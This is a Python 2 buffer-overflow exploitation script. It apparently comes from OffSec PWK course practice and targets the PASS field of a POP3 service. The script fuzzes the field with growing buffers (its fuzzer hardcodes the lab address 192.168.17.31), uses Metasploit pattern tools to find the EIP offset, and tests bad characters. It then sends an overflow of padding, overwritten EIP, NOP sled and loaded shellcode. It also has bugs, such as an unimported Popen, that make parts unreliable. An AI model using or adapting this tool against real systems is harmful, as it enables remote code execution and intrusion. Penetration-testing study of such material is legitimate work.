#!/usr/bin/python

import socket

import sys, time

import struct

from subprocess import check_output, PIPE

import importlib


# Usage: overflow.py -h
# Usage: overflow.py -p <pattern>
# Usage: overflow.py -f <ip> <port> [<increment>]
# Usage: overflow.py -[m|s] <ip> <port> <buffer size> [<EIP> <payload>]
# Usage: overflow.py -[m|s]i <ip> <port> <buffer size> [<EIP> <payload file>]
# Usage: overflow.py -[m|s]b <ip> <port> <buffer size> [<EIP>]
# Built by G0li4th

option = ''
pattern = ''
ip = ''
port = ''
increment = 200
buff_size=''
EIP=''
payload=''
buff=''
# I wanted to build this in a loop, but it was easier to copy and paste it from the PWK text book.
# Thanks OFFSEC Guys!
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10"			#Removed Character \x0a Line Feed 
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"		#Removed Character \x0d Carriage Return
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


try:
	if len(sys.argv) < 2 or sys.argv[1]=='-h':
		raise RuntimeError("Displaying Help Message")
	if len(sys.argv) >= 3 and len(sys.argv)<=7:
		option=sys.argv[1]
		
	else:
		raise SyntaxError("Invalid number of Parameters")

		# Handle Pattern Offset
		# First because it requires the fewest parameters
	if option == '-p' and len(sys.argv)==3: 
		pattern=sys.argv[2]
		Popen(['/usr/share/metasploit-framework/tools/pattern_offset.rb', pattern]).communicate()
		raise SystemExit("Program Exited Successfully")
	# END Pattern Offset

	# Take care of additional parameters
	ip=sys.argv[2]
	if len(sys.argv)<4:
		raise SyntaxError("Invalid number of Parameters")
	port = int(sys.argv[3])


	# Handle the fuzzer
	if option =='-f':
		print "This segment must be manually aborted using the ^C keyboard command."
		if len(sys.argv)==5:
			increment=int(sys.argv[4])
		if len(sys.argv) > 5:
			raise SyntaxError("Invalid number of Parameters")
		buffval="A"
		maxbuff=30
		buffer=[buffval]
		counter=100
		while len(buffer) <= maxbuff:
			buffer.append(buffval*counter)
			counter=counter+increment

		for string in buffer:
			s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			connect=s.connect(('192.168.17.31', 110))
			print "Fuzzing PASS with %s bytes" % len(string)
			s.recv(1024)
			s.send('USER test\r\n')
			s.recv(1024)
			s.send('PASS '+string+'\r\n')
			s.recv(1024)
			s.send('QUIT\r\n')
			s.close()
		raise SystemExit("Program Exited Successfully")
		# End Fuzzer


	# Get more Parameters
	if len(sys.argv) < 5:
		raise SyntaxError("Invalid number of Parameters")
	buff_size=sys.argv[4]
	if len(sys.argv) > 5:
		inter=int(sys.argv[5],16)
		EIP=struct.pack('<I', inter)
		#print EIP
	if len(sys.argv) == 7:
		payload=sys.argv[6]
		
	if len(sys.argv) > 7:
		raise SyntaxError("Invalid number of Parameters")


	# Get values for -s and -m
	if option=='-s' or option=='-si' or option=='-sb':
		buff="A"*int(buff_size)
	if option=='-m' or option=='-mi' or option=='-mb':
		buff=check_output(['/usr/share/metasploit-framework/tools/pattern_create.rb', buff_size])
	if (option=='-sb' or option=='-mb'):
		if len(sys.argv) > 6:
			raise SyntaxError("Invalid number of Parameters")
		else:
			payload=badchars
	if (option=='-si' or option=='-mi'): 
		if len(sys.argv)!=7:
			raise SyntaxError("Invalid number of Parameters")
		else:
			payloadfile=sys.argv[6]
			payload=importlib.import_module("%s" % payloadfile)

	buff=buff+EIP+("\x90"*20)+payload.shellcode #throw in some NOPs to help things get moving.

	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect((ip, port))
	print "Overflowing PASS with %s bytes" %len(buff)
	#print buff
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send('PASS '+buff+'\r\n')
	s.close()

except (SystemExit, KeyboardInterrupt) as e: # Don't have keyboard interrupts or system exits print full help menu.
	print "[*][*][*] %s" % e
except (RuntimeError, SyntaxError) as e: # Used a syntax error to catch usage errors as well.
	print "[***] %s" % e
	print "[*] overflow.py: written and maintained by G0li4th"
	print "[*]	This is made to be a multi-purpose buffer overflow tool."
	print "[*]	Can fuzz a field to determine a general range for the buffer."
	print "[*]	After determining the range, the metasploit tool can be used to narrow down the buffer size."
	print "[*]	The result in EIP can be used with the metasploit pattern offset tool"
	print "[*]	EIP value and payload can be input via commandline, or payload can be loaded from file."
	print "[*]	Final Function implemented allows for the user to test for bad characters in the target buffer"
	print "[*]"
	print "[*] Syntax: %s <option> (<ip>|<pattern>) <port> [(<increment>)| (<buffer size> <EIP> [<payload>])]" % sys.argv[0]
	print "[*]"
	print "[*] Data Types:"
	print "[*]	String:"
	print "[*]		<ip>"
	print "[*]		<pattern>"
	print "[*]		<EIP>"
	print "[*]		<payload>"
	print "[*]	Int:"
	print "[*]		<port>"
	print "[*]		<increment>"
	print "[*]		<buffer size>"
	print "[*]	File Name:(with the -i option)"
	print "[*]		<payload>"
	print "[*]"
	print "[*] Options:"
	print "[*]	-h displays this 'h'elp message"
	print "[*]		Usage: overflow.py -h"
	print "[*]	-f 'f'uzzes the field with buffer built of 0x41: \"A\" (default increment: 200 bytes)"
	print "[*]		Usage: overflow.py -f <ip> <port> [<increment>]"
	print "[*]	-[s|m][i|b] uses 'm'etasploit generated buffer (find the correct buffer size using -p next)"
	print "[*]				or 's'tandard buffer built of 0x41: \"A\" (fixed size only)"
	print "[*]				Make sure to use double \\ so that bash doesn't remove characters."
	print "[*]		Usage: overflow.py -m <ip> <port> <buffer size> [<EIP> [<payload>]"
	print "[*]		Usage: overflow.py -si <ip> <port> <buffer size> [<EIP> [<payload file>]"
	print "[*]		Usage: overflow.py -mb <ip> <port> <buffer size> [<EIP>]"
	print "[*]	-p use metasploit 'p'attern offset to find the correct buffer size (this option is irregular, but useful)"
	print "[*]		Usage: overflow.py -p <pattern>"
	print "[*]	-i signifies that the <payload> value will be an 'i'nput file.  This option cannot be used alone."
	print "[*]	-b Checks for 'b'ad characters to avoid in <payload> "
	print "[*]		(consists of all possible ASCII characters. Does not take a payload parameter)  This option cannot be used alone."
	print "[***]"
except BaseException as e: #Catch all other errors with rich error reporting for debugging purposes.
	print e
	print "Unknown error occurred.  Please review your syntax using %s -h" % sys.argv[0]